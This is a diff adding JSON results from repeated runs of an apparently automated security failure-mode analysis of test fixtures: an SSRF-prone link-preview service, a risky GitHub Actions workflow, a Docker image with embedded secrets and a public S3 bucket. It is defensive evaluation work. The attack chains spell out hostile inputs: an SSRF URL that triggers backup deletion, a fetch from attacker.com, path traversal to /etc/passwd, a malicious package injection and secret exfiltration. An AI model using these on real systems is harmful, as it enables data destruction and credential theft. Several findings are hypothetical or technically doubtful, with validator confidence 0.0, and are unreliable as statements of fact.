+              "business_impact": "Exposure of internal service details, endpoint structures, or sensitive data from admin interfaces. Enables reconnaissance for further attacks.",
+              "blast_radius": "Limited to data exposed by internal services, but could reveal attack paths for higher-impact exploits (e.g., backup deletion).",
+              "attack_chain": [
+                "Attacker sends request to /preview with url targeting internal service (e.g., http://127.0.0.1:9000/)",
+                "public.py fetches the internal service response",
+                "Response content (e.g., admin endpoints, error messages) is returned to attacker"
+              ],
+              "severity": 7,
+              "occurrence": 8,
+              "detection": 6,
+              "rpn": 336,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service via outbound request flooding",
+              "trigger": "High-volume requests to /preview?url=<slow-responding-URL> (e.g., http://10.0.0.1:1234/delay)",
+              "evidence": "public.py:10 ('resp = requests.get(url, timeout=5)')",
+              "business_impact": "Service degradation or outage for /preview endpoint, affecting all users relying on link previews. Potential resource starvation for the host.",
+              "blast_radius": "Limited to public.py service, but could impact co-located services (internal_admin.py) if host resources are exhausted.",
+              "attack_chain": [
+                "Attacker sends rapid, concurrent requests to /preview with slow or unresponsive URLs",
+                "public.py spawns multiple outbound HTTP requests (timeout=5s each)",
+                "Thread/connection pool exhaustion in public.py or underlying system"
+              ],
+              "severity": 6,
+              "occurrence": 7,
+              "detection": 5,
+              "rpn": 210,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Arbitrary code execution via SSRF to malicious server",
+              "trigger": "Single HTTP GET request to /preview?url=http://attacker.com/exploit from external source",
+              "evidence": "public.py:10 ('resp = requests.get(url, timeout=5)'), public.py:11 ('return resp.text[:2000]')",
+              "business_impact": "Full host compromise if exploit succeeds, leading to data theft, lateral movement, or persistent access. Affects all services on the host.",
+              "blast_radius": "Entire host and potentially adjacent systems if lateral movement is possible.",
+              "attack_chain": [
+                "Attacker hosts a server that returns malicious content (e.g., exploit for a vulnerability in requests library)",
+                "Attacker sends request to /preview with url pointing to their server",
+                "public.py fetches and processes the response, potentially triggering a vulnerability in the requests library or Python interpreter"
+              ],
+              "severity": 10,
+              "occurrence": 4,
+              "detection": 8,
+              "rpn": 320,
+              "priority": "Critical",
+              "validator_confidence": 0.9
+            },
+            {
+              "failure_mode": "Race condition in backup deletion (TOCTOU)",
+              "trigger": "Rapid, concurrent requests to /wipe-backups from localhost",
+              "evidence": "internal_admin.py:11 ('shutil.rmtree(\"/var/backups/shop\", ignore_errors=True)')",
+              "business_impact": "Corrupted or incomplete backups, leading to unreliable recovery. Operations team may believe backups exist when they are unusable.",
+              "blast_radius": "Limited to /var/backups/shop directory, but critical for business continuity.",
+              "attack_chain": [
+                "Attacker with localhost access triggers /wipe-backups multiple times in rapid succession",
+                "Between the check (if any) and shutil.rmtree execution, backup files may be recreated or modified",
+                "Partial or inconsistent deletion of backups occurs"
+              ],
+              "severity": 8,
+              "occurrence": 4,
+              "detection": 9,
+              "rpn": 288,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Unauthorized access to internal_admin.py via misconfigured network",
+              "trigger": "Network misconfiguration exposing internal_admin.py to external access",
+              "evidence": "internal_admin.py:6 ('Listens on 127.0.0.1:9000'), internal_admin.py:9-12 ('No authentication/authorization')",
+              "business_impact": "Immediate and irreversible loss of shop backups, causing business stoppage. Affects all customers and operations.",
+              "blast_radius": "Direct deletion of Tier 1 critical data store (/var/backups/shop). No lateral movement needed.",
+              "attack_chain": [
+                "Network misconfiguration (e.g., firewall rule, NAT, or proxy) exposes localhost:9000 to external network",
+                "External attacker directly accesses /wipe-backups endpoint",
+                "Backup deletion occurs without any authentication"
+              ],
+              "severity": 10,
+              "occurrence": 5,
+              "detection": 7,
+              "rpn": 350,
+              "priority": "High",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.181044,
+          "seconds": 115.2,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "SSRF to Internal Admin Endpoint via /preview",
+              "trigger": "HTTP GET request to /preview with url parameter set to localhost:9000/wipe-backups",
+              "evidence": "public.py:9-10 ('url = request.args[\"url\"]', 'resp = requests.get(url, timeout=5)'), internal_admin.py:6,10-11 ('Listens on 127.0.0.1:9000', 'shutil.rmtree(\"/var/backups/shop\", ignore_errors=True)')",
+              "business_impact": "Permanent data loss of shop backups, affecting disaster recovery and business continuity. Operations staff lose ability to restore critical data.",
+              "blast_radius": "Local host only, but destroys all shop backups. No lateral movement beyond host, but total backup loss is catastrophic.",
+              "attack_chain": [
+                "Attacker sends crafted request to /preview with url=http://127.0.0.1:9000/wipe-backups",
+                "public.py:10 executes requests.get() to the internal admin endpoint",
+                "internal_admin.py:11 triggers shutil.rmtree('/var/backups/shop')",
+                "Backup directory is deleted without authentication"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 1.0
+            },
+            {
+              "failure_mode": "Arbitrary File Deletion via SSRF + Path Traversal",
+              "trigger": "Crafted /preview request targeting internal admin endpoint with malicious path (hypothetical but plausible extension)",
+              "evidence": "internal_admin.py:11 ('shutil.rmtree(\"/var/backups/shop\", ignore_errors=True)') \u2014 current code is fixed path but lacks input validation",
+              "business_impact": "If path traversal were possible, could delete system files, causing OS instability or total system compromise. Currently limited to backup deletion.",
+              "blast_radius": "Host-level impact. Could extend to OS if path traversal is introduced.",
+              "attack_chain": [
+                "Attacker sends /preview request with url=http://127.0.0.1:9000/wipe-backups?path=../../../etc/passwd",
+                "If internal_admin.py were to use the path parameter (hypothetical extension), it could delete arbitrary files",
+                "Even without path parameter, the current code deletes a fixed critical directory"
+              ],
+              "severity": 9,
+              "occurrence": 5,
+              "detection": 8,
+              "rpn": 360,
+              "priority": "High",
+              "validator_confidence": 0.7
+            },
+            {
+              "failure_mode": "Denial of Service via Outbound Request Flooding",
+              "trigger": "High-volume requests to /preview with urls that hang (e.g., http://10.0.0.1:12345 or slow external sites)",
+              "evidence": "public.py:10 ('resp = requests.get(url, timeout=5)')",
+              "business_impact": "Link preview service becomes unavailable, degrading user experience for any feature relying on previews. Customers experience slow/failed page loads.",
+              "blast_radius": "Limited to public.py service, but could cascade if other services depend on it.",
+              "attack_chain": [
+                "Attacker sends rapid /preview requests with url pointing to slow or non-responsive endpoints",
+                "public.py:10 blocks on requests.get() with timeout=5, tying up Flask worker threads",
+                "Service becomes unresponsive under load, exhausting thread pool"
+              ],
+              "severity": 7,
+              "occurrence": 8,
+              "detection": 6,
+              "rpn": 336,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Information Disclosure via SSRF to Internal Services",
+              "trigger": "HTTP GET to /preview with url targeting localhost or internal IPs on various ports",
+              "evidence": "public.py:9-11 ('url = request.args[\"url\"]', 'resp = requests.get(url, timeout=5)', 'return resp.text[:2000]')",
+              "business_impact": "Exposure of internal service details (e.g., stack traces, environment variables, or admin endpoints) aids further attacks. Security team loses confidentiality of internal infrastructure.",
+              "blast_radius": "Information leak limited to what internal services return, but enables reconnaissance for deeper attacks.",
+              "attack_chain": [
+                "Attacker sends /preview request with url=http://127.0.0.1:9000/ (or other internal ports)",
+                "public.py:10 fetches internal service responses, returning first 2000 chars to attacker",
+                "Attacker gains visibility into internal service responses, potentially exposing config, errors, or data"
+              ],
+              "severity": 8,
+              "occurrence": 9,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Race Condition in Backup Deletion (TOCTOU)",
+              "trigger": "Rapid concurrent requests to /wipe-backups via SSRF (currently no check, but future code might introduce TOCTOU)",
+              "evidence": "internal_admin.py:11 ('shutil.rmtree(\"/var/backups/shop\", ignore_errors=True)') \u2014 no pre-check, but ignore_errors=True masks race effects",
+              "business_impact": "Inconsistent backup state, potential data corruption if deletion races with backup operations. Operations staff may restore incomplete or corrupted data.",
+              "blast_radius": "Limited to backup directory, but could corrupt recovery process.",
+              "attack_chain": [
+                "Admin service checks for backup existence (hypothetical, not in current code) then deletes it",
+                "Attacker repeatedly triggers /wipe-backups via SSRF during the window",
+                "If checks were added later, TOCTOU could allow deletion of wrong directory or during restore"
+              ],
+              "severity": 6,
+              "occurrence": 3,
+              "detection": 9,
+              "rpn": 162,
+              "priority": "Medium",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Cascading Failure from Backup Deletion",
+              "trigger": "Single successful request to /preview with url=http://127.0.0.1:9000/wipe-backups",
+              "evidence": "internal_admin.py:11 ('shutil.rmtree(\"/var/backups/shop\", ignore_errors=True)')",
+              "business_impact": "Loss of backup integrity breaks disaster recovery workflows. Business faces extended downtime if primary data is lost. Customers experience prolonged outages.",
+              "blast_radius": "Affects all systems relying on /var/backups/shop. Could halt automated recovery pipelines.",
+              "attack_chain": [
+                "Attacker triggers /wipe-backups via SSRF, deleting /var/backups/shop",
+                "Backup-dependent services (e.g., restore scripts) fail when backups are missing",
+                "Automated recovery systems may crash or enter error states"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 8,
+              "rpn": 640,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Unauthenticated Privilege Escalation via Localhost Access",
+              "trigger": "Initial compromise of public.py (e.g., via RCE in Flask or requests library) followed by localhost requests",
+              "evidence": "internal_admin.py:6 ('Listens on 127.0.0.1:9000'), public.py:10 ('requests.get(url, timeout=5)') \u2014 both on same host, no auth",
+              "business_impact": "Full control over internal admin functions from a public-facing service breach. Attacker can delete backups, disrupt operations, or pivot to other internal systems.",
+              "blast_radius": "Host-wide compromise. Enables lateral movement if other localhost services exist.",
+              "attack_chain": [
+                "Attacker compromises public.py (e.g., via another vulnerability) to gain code execution",
+                "From public.py's context, attacker makes direct HTTP calls to localhost:9000/wipe-backups",
+                "No auth required, so attacker can delete backups or interact with other internal endpoints"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 9,
+              "rpn": 630,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.177612,
+          "seconds": 112.2,
+          "llm_calls": 21
+        }
+      ]
+    },
+    "infra-deploy": {
+      "runs": [
+        {
+          "findings": [
+            {
+              "failure_mode": "GitHub Actions PR Target Injection via pull_request_target",
+              "trigger": "Attacker submits a PR from a forked repo with malicious code in build.sh",
+              "evidence": "path:.github/workflows/release.yml:3-4 'pull_request_target: types: [opened, synchronize]'; path:.github/workflows/release.yml:12 'ref: ${{ github.event.pull_request.head.sha }}'; path:.github/workflows/release.yml:15 'DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}'",
+              "business_impact": "Full compromise of CI/CD pipeline and production deployment keys. Enables supply-chain attack on all downstream systems. Direct harm to business reputation, customer trust, and operational integrity.",
+              "blast_radius": "CI environment, DEPLOY_KEY secret, production deployment systems, and any system accessible via the leaked key. Potential for lateral movement to all Tier 1 assets.",
+              "attack_chain": [
+                "Attacker opens a malicious PR from a forked repository",
+                "pull_request_target event triggers the release.yml workflow (path:.github/workflows/release.yml:3-4)",
+                "Workflow checks out the attacker's PR code (ref: github.event.pull_request.head.sha) (path:.github/workflows/release.yml:12)",
+                "Attacker's build.sh script executes in the CI environment with access to DEPLOY_KEY secret (path:.github/workflows/release.yml:15)",
+                "DEPLOY_KEY is exfiltrated or used to push malicious code to production"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 1.0
+            },
+            {
+              "failure_mode": "Credential Leak via Docker Image with Embedded config.env",
+              "trigger": "Docker image build and push to any registry (even private ones with weak access controls)",
+              "evidence": "path:Dockerfile:21 'COPY . /app'; path:Dockerfile:22 'COPY config.env /app/config.env'; path:config.env:1-2 'API_KEY=... DB_PASSWORD=...'",
+              "business_impact": "Exposure of production API keys and database credentials. Enables direct database access, API abuse, and potential data exfiltration. Harms customers (data breach) and business (compliance violations, financial penalties).",
+              "blast_radius": "All systems using API_KEY or DB_PASSWORD (Tier 1 assets). Potential for full database compromise and lateral movement to connected services.",
+              "attack_chain": [
+                "Dockerfile copies entire repository including config.env (path:Dockerfile:21-22)",
+                "config.env containing API_KEY and DB_PASSWORD is baked into the image (path:config.env:1-2)",
+                "Image is pushed to a registry (public or private) where it may be accessed by unauthorized parties",
+                "Attacker extracts config.env from the image layers to obtain credentials"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 1.0
+            },
+            {
+              "failure_mode": "Public S3 Bucket Data Exfiltration (customer-backups)",
+              "trigger": "Bucket creation or any write operation to the bucket (data becomes immediately public)",
+              "evidence": "path:storage.tf:2 'bucket = \"customer-backups\"'; path:storage.tf:7 'acl = \"public-read\"'",
+              "business_impact": "Direct exposure of customer data and internal backups. Violates data protection regulations (GDPR, CCPA). Harms customers (privacy breach) and business (legal liability, reputational damage).",
+              "blast_radius": "All data stored in the 'customer-backups' bucket. If backups include credentials or keys, enables further compromise of Tier 1 systems.",
+              "attack_chain": [
+                "S3 bucket 'customer-backups' is configured with public-read ACL (path:storage.tf:7)",
+                "Attacker enumerates or guesses the bucket name ('customer-backups')",
+                "Attacker lists and downloads all objects in the bucket without authentication",
+                "Sensitive backup data (e.g., database dumps, config files) is exposed"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 490,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Secrets Exposure via GitHub Actions Environment Logging",
+              "trigger": "Workflow execution with a step that leaks environment variables (e.g., set -x in build.sh or explicit echo)",
+              "evidence": "path:.github/workflows/release.yml:15 'DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}'",
+              "business_impact": "Compromise of deployment credentials, enabling unauthorized code pushes or infrastructure changes. Harms operations staff (loss of control) and business (supply-chain risk).",
+              "blast_radius": "CI/CD pipeline, DEPLOY_KEY, and any system deployable via the key (Tier 1 assets).",
+              "attack_chain": [
+                "DEPLOY_KEY is injected into the workflow environment (path:.github/workflows/release.yml:15)",
+                "Malicious PR or misconfigured step causes the secret to be printed to logs (e.g., via echo or debug output)",
+                "GitHub Actions logs are accessible to repository maintainers or attackers with PR access",
+                "Secret is extracted from logs and used for unauthorized access"
+              ],
+              "severity": 9,
+              "occurrence": 6,
+              "detection": 6,
+              "rpn": 324,
+              "priority": "High",
+              "validator_confidence": 0.9
+            },
+            {
+              "failure_mode": "TOCTOU Race Condition in GitHub Actions Checkout",
+              "trigger": "Attacker force-pushes to PR branch after initial submission but before workflow execution completes",
+              "evidence": "path:.github/workflows/release.yml:10-12 'actions/checkout@v4 with ref: ${{ github.event.pull_request.head.sha }}'; path:.github/workflows/release.yml:13 './scripts/build.sh'",
+              "business_impact": "Bypasses PR review process, enabling execution of arbitrary code in CI with high privileges. Harms operations (unauthorized deployments) and business (supply-chain attack).",
+              "blast_radius": "CI environment, DEPLOY_KEY, and any system accessible via the workflow (Tier 1 assets).",
+              "attack_chain": [
+                "pull_request_target workflow checks out attacker-controlled PR code (path:.github/workflows/release.yml:10-12)",
+                "Between checkout and build.sh execution, attacker modifies the PR branch (e.g., via force-push)",
+                "build.sh executes the *new* malicious code instead of the originally reviewed version",
+                "DEPLOY_KEY is used by the updated malicious code"
+              ],
+              "severity": 9,
+              "occurrence": 4,
+              "detection": 9,
+              "rpn": 324,
+              "priority": "High",
+              "validator_confidence": 0.85
+            },
+            {
+              "failure_mode": "Docker Image Supply-Chain Attack via Malicious requirements.txt",
+              "trigger": "PR merging a modified requirements.txt with a malicious dependency",
+              "evidence": "path:Dockerfile:21 'COPY . /app'; path:Dockerfile:23 'RUN pip install -r requirements.txt'; path:requirements.txt:1 'flask'",
+              "business_impact": "Compromise of the container image and runtime environment. Enables data exfiltration, backdoors, or lateral movement. Harms customers (if runtime is affected) and business (supply-chain integrity).",
+              "blast_radius": "Docker image, runtime environment, and any system interacting with the container (Tier 1/2 assets).",
+              "attack_chain": [
+                "requirements.txt includes 'flask' (path:requirements.txt:1), but attacker modifies it in a PR to include a malicious package (e.g., 'flask; pip install evil-package')",
+                "Dockerfile copies the entire repo (path:Dockerfile:21), including the tampered requirements.txt",
+                "Docker build installs the malicious package (path:Dockerfile:23 'pip install -r requirements.txt')",
+                "Malicious package executes during build or runtime, exfiltrating config.env or other secrets"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 8,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.8
+            },
+            {
+              "failure_mode": "Cascading Failure from Public S3 Bucket + Leaked DB_PASSWORD",
+              "trigger": "Existence of a database dump in the public S3 bucket combined with leaked DB_PASSWORD",
+              "evidence": "path:storage.tf:7 'acl = \"public-read\"'; path:config.env:2 'DB_PASSWORD=...'; path:Dockerfile:22 'COPY config.env /app/config.env'",
+              "business_impact": "Complete database compromise leading to downtime, data loss, or corruption. Harms customers (service outage, data breach) and business (operational halt, compliance violations).",
+              "blast_radius": "Production database, all services using DB_PASSWORD (Tier 1), and any system dependent on the database (Tier 2).",
+              "attack_chain": [
+                "Public S3 bucket (customer-backups) exposes a database dump (path:storage.tf:7)",
+                "Attacker extracts DB_PASSWORD from config.env (leaked via Docker image or GitHub Actions) (path:config.env:2)",
+                "Attacker uses DB_PASSWORD to access the production database directly",
+                "Database is dumped, modified, or deleted, affecting all dependent services"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 8,
+              "rpn": 640,
+              "priority": "Critical",
+              "validator_confidence": 0.9
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.165805,
+          "seconds": 111.5,
+          "llm_calls": 14
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "GitHub Actions pull_request_target supply-chain attack",
+              "trigger": "Malicious PR targeting main branch with crafted build.sh script",
+              "evidence": "path:.github/workflows/release.yml:3-4 ('pull_request_target: types: [opened, synchronize]'), path:.github/workflows/release.yml:12 ('ref: ${{ github.event.pull_request.head.sha }}'), path:.github/workflows/release.yml:15 ('DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}')",
+              "business_impact": "Full supply-chain compromise: attacker gains deployment access, can push malicious containers to production, affecting all customers and backend systems",
+              "blast_radius": "Entire deployment pipeline and production environment; enables lateral movement to all systems using the deployed container",
+              "attack_chain": [
+                "Attacker opens a malicious PR targeting the main branch",
+                "pull_request_target event triggers release.yml workflow (path:.github/workflows/release.yml:3-4)",
+                "Workflow checks out attacker's PR code (ref: github.event.pull_request.head.sha) (path:.github/workflows/release.yml:12)",
+                "Attacker's build.sh script executes with DEPLOY_KEY secret in environment (path:.github/workflows/release.yml:15)",
+                "Script exfiltrates DEPLOY_KEY or injects malicious code into Docker image",
+                "Compromised image is deployed using stolen DEPLOY_KEY"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 8,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Public S3 bucket data exfiltration/tampering",
+              "trigger": "Network scan or public bucket enumeration tools (e.g., bucketstream, lazys3)",
+              "evidence": "path:storage.tf:7 ('acl = \"public-read\"')",
+              "business_impact": "Customer data breach (PII/financial records), loss of backup integrity, regulatory violations (GDPR/CCPA), reputational damage",
+              "blast_radius": "All customer data stored in backups; potential for permanent data loss if backups are corrupted/deleted",
+              "attack_chain": [
+                "Attacker discovers S3 bucket 'customer-backups' via enumeration",
+                "Bucket has public-read ACL (path:storage.tf:7)",
+                "Attacker downloads all backup files containing sensitive customer data",
+                "Attacker may modify or delete backups to disrupt recovery operations"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 8,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Docker image with embedded secrets",
+              "trigger": "Container image published to registry (public or private with weak access controls)",
+              "evidence": "path:Dockerfile:21 ('COPY . /app'), path:Dockerfile:22 ('COPY config.env /app/config.env'), path:config.env:1-2 ('API_KEY=...', 'DB_PASSWORD=...')",
+              "business_impact": "Backend system compromise (API abuse, database theft/modification), potential for full data breach and service disruption",
+              "blast_radius": "All systems using the leaked API_KEY/DB_PASSWORD; enables database access and API abuse",
+              "attack_chain": [
+                "Dockerfile copies entire repository into container (path:Dockerfile:21)",
+                "Includes config.env with API_KEY and DB_PASSWORD (path:Dockerfile:22)",
+                "Container image is pushed to public/private registry",
+                "Attacker pulls image and extracts config.env from /app/config.env",
+                "Uses credentials to access backend systems (API, database)"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 441,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "config.env credential leak via workflow logs",
+              "trigger": "PR with code that prints environment variables (e.g., `env` or `print(os.environ)` in build.sh)",
+              "evidence": "path:config.env:1-2 ('API_KEY=...', 'DB_PASSWORD=...'), path:.github/workflows/release.yml:15 ('DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}')",
+              "business_impact": "Direct access to backend systems (API, database) via leaked credentials, leading to data theft or manipulation",
+              "blast_radius": "All systems protected by API_KEY/DB_PASSWORD; potential for full backend compromise",
+              "attack_chain": [
+                "Attacker submits PR with malicious code that reads environment variables",
+                "Workflow runs with config.env credentials loaded (if misconfigured)",
+                "Malicious code dumps environment variables to stdout",
+                "GitHub Actions logs capture and expose the credentials",
+                "Attacker retrieves logs from PR workflow run"
+              ],
+              "severity": 9,
+              "occurrence": 6,
+              "detection": 8,
+              "rpn": 432,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "TOCTOU race in workflow checkout and build",
+              "trigger": "Rapid PR branch updates during workflow execution window",
+              "evidence": "path:.github/workflows/release.yml:10-13 ('actions/checkout@v4', 'ref: ${{ github.event.pull_request.head.sha }}', './scripts/build.sh')",
+              "business_impact": "Supply-chain attack via race condition; attacker gains deployment access or injects malicious code into production",
+              "blast_radius": "Entire deployment pipeline and any systems using the deployed artifacts",
+              "attack_chain": [
+                "Attacker rapidly updates PR branch between workflow checkout (path:.github/workflows/release.yml:10-12) and build execution (path:.github/workflows/release.yml:13)",
+                "Workflow checks out commit A but attacker replaces it with commit B (malicious) before build.sh runs",
+                "build.sh executes attacker's code with DEPLOY_KEY access",
+                "Attacker's code exfiltrates DEPLOY_KEY or modifies build artifacts"
+              ],
+              "severity": 9,
+              "occurrence": 5,
+              "detection": 9,
+              "rpn": 405,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Flask service credential exposure via misconfiguration",
+              "trigger": "Container access via exposed ports, misconfigured networking, or image inspection",
+              "evidence": "path:requirements.txt:1 ('flask'), path:config.env:1-2 ('API_KEY=...', 'DB_PASSWORD=...'), path:Dockerfile:21-22 ('COPY . /app', 'COPY config.env /app/config.env')",
+              "business_impact": "Unauthorized access to backend APIs and databases, leading to data exfiltration or corruption",
+              "blast_radius": "All systems using the exposed API_KEY/DB_PASSWORD; potential for full backend compromise",
+              "attack_chain": [
+                "main.py (Flask service) loads config.env credentials at runtime (implied by requirements.txt:1)",
+                "If config.env is mounted or included in container, credentials are accessible",
+                "Attacker gains access to container (via misconfigured network, sidecar, or image pull)",
+                "Extracts config.env and uses API_KEY/DB_PASSWORD to access backend systems"
+              ],
+              "severity": 8,
+              "occurrence": 6,
+              "detection": 7,
+              "rpn": 336,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Backup S3 bucket as single point of failure (cascading deletion)",
+              "trigger": "Compromised AWS credentials with s3:DeleteObject permissions on 'customer-backups'",
+              "evidence": "path:storage.tf:1-2 ('resource \"aws_s3_bucket\" \"backups\"'), path:storage.tf:7 ('acl = \"public-read\"')",
+              "business_impact": "Permanent data loss, inability to recover from disasters, extended downtime, regulatory penalties",
+              "blast_radius": "All systems relying on backups for recovery; entire business operations if backups are critical",
+              "attack_chain": [
+                "Attacker gains AWS credentials (e.g., via leaked DEPLOY_KEY or IAM misconfiguration)",
+                "Deletes or corrupts objects in 'customer-backups' bucket (path:storage.tf:2)",
+                "No versioning or MFA-delete enabled on bucket",
+                "Backup data is permanently lost",
+                "Production systems cannot recover from outages or ransomware"
+              ],
+              "severity": 10,
+              "occurrence": 5,
+              "detection": 8,
+              "rpn": 400,
+              "priority": "High",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.183586,
+          "seconds": 121.0,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "GitHub Actions pull_request_target injection leading to DEPLOY_KEY exfiltration",
+              "trigger": "Malicious PR targeting the repository with a crafted build.sh script that leaks secrets",
+              "evidence": ".github/workflows/release.yml:3-4 ('pull_request_target: types: [opened, synchronize]'), .github/workflows/release.yml:12 ('ref: ${{ github.event.pull_request.head.sha }}'), .github/workflows/release.yml:15 ('DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}')",
+              "business_impact": "Unauthorized deployments to production, potential supply chain compromise affecting all downstream systems. Operations staff lose control of deployment pipeline. Customers may receive malicious updates.",
+              "blast_radius": "Tier 1 (release.yml, DEPLOY_KEY) \u2192 Tier 2 (Dockerfile, main.py) \u2192 All deployed instances \u2192 Potential lateral movement to adjacent systems via compromised deployments",
+              "attack_chain": [
+                "Attacker opens a malicious PR from their fork",
+                "pull_request_target event triggers release.yml workflow (path:.github/workflows/release.yml:3-4)",
+                "Workflow checks out attacker's PR code (ref: github.event.pull_request.head.sha) (path:.github/workflows/release.yml:12)",
+                "Attacker's build.sh script (executed in step 13) exfiltrates DEPLOY_KEY via env (path:.github/workflows/release.yml:15)",
+                "DEPLOY_KEY is exposed to attacker-controlled code"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 9,
+              "rpn": 630,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Hardcoded credentials in Docker image via config.env",
+              "trigger": "Docker image build and deployment (automated or manual) with the current Dockerfile",
+              "evidence": "Dockerfile:22 ('COPY config.env /app/config.env'), config.env:1-2 ('API_KEY=...', 'DB_PASSWORD=...')",
+              "business_impact": "Full database compromise (DB_PASSWORD) and API abuse (API_KEY). Customers' data exposed, business operations disrupted. Potential regulatory fines for data breach.",
+              "blast_radius": "Tier 1 (config.env, Dockerfile) \u2192 All containers derived from this image \u2192 All services using these credentials \u2192 Potential pivot to database and external APIs",
+              "attack_chain": [
+                "Dockerfile copies config.env into the image (path:Dockerfile:22)",
+                "Image is built with API_KEY and DB_PASSWORD embedded (path:config.env:1-2)",
+                "Image is deployed to production or shared publicly",
+                "Attacker extracts credentials from image layers"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 8,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Public S3 bucket data exfiltration (customer-backups)",
+              "trigger": "Any internet-connected entity performing a GET request on the bucket URL",
+              "evidence": "storage.tf:7 ('acl = \"public-read\"')",
+              "business_impact": "Massive data breach of customer backups. Loss of customer trust, regulatory penalties (GDPR, CCPA), potential legal action. Business reputation irreparably damaged.",
+              "blast_radius": "Tier 1 (storage.tf, aws_s3_bucket.backups) \u2192 All data stored in customer-backups bucket \u2192 Potential exposure of PII, financial data, or intellectual property",
+              "attack_chain": [
+                "S3 bucket 'customer-backups' is configured with public-read ACL (path:storage.tf:7)",
+                "Attacker enumerates bucket via HTTP requests (e.g., https://customer-backups.s3.amazonaws.com/)",
+                "Attacker downloads all backup files containing sensitive customer data"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 7,
+              "rpn": 630,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Dependency confusion via malicious Flask package",
+              "trigger": "Docker image rebuild with network access to PyPI (default behavior)",
+              "evidence": "requirements.txt:1 ('flask'), Dockerfile:23 ('RUN pip install -r requirements.txt')",
+              "business_impact": "Arbitrary code execution in all deployed containers. Attacker gains control of application logic, can exfiltrate data, or pivot to other systems. Customers and operations staff affected.",
+              "blast_radius": "Tier 2 (requirements.txt, main.py) \u2192 All containers using this Dockerfile \u2192 All services depending on Flask \u2192 Potential lateral movement via compromised runtime",
+              "attack_chain": [
+                "requirements.txt specifies 'flask' without version pinning (path:requirements.txt:1)",
+                "Attacker publishes a malicious 'flask' package to PyPI with a higher version number",
+                "Docker build (path:Dockerfile:23) installs the malicious package",
+                "Malicious code executes during runtime (e.g., in main.py) or at import time"
+              ],
+              "severity": 9,
+              "occurrence": 6,
+              "detection": 8,
+              "rpn": 432,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "TOCTOU race condition in GitHub Actions workflow",
+              "trigger": "Rapid PR updates by attacker during the window between checkout and build execution",
+              "evidence": ".github/workflows/release.yml:10-13 ('actions/checkout@v4', 'run: ./scripts/build.sh')",
+              "business_impact": "Bypass of PR review process. Malicious code deployed with legitimate credentials. Production systems compromised. Operations staff may not detect the attack until it's too late.",
+              "blast_radius": "Tier 1 (release.yml, DEPLOY_KEY) \u2192 Tier 2 (Dockerfile, main.py) \u2192 All deployed instances",
+              "attack_chain": [
+                "Workflow checks out PR code (path:.github/workflows/release.yml:10-12)",
+                "Between checkout and build.sh execution (path:.github/workflows/release.yml:13), attacker modifies their PR branch",
+                "build.sh executes with stale code reference but attacker's latest malicious payload",
+                "DEPLOY_KEY is exposed to the modified (malicious) build script"
+              ],
+              "severity": 9,
+              "occurrence": 5,
+              "detection": 9,
+              "rpn": 405,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
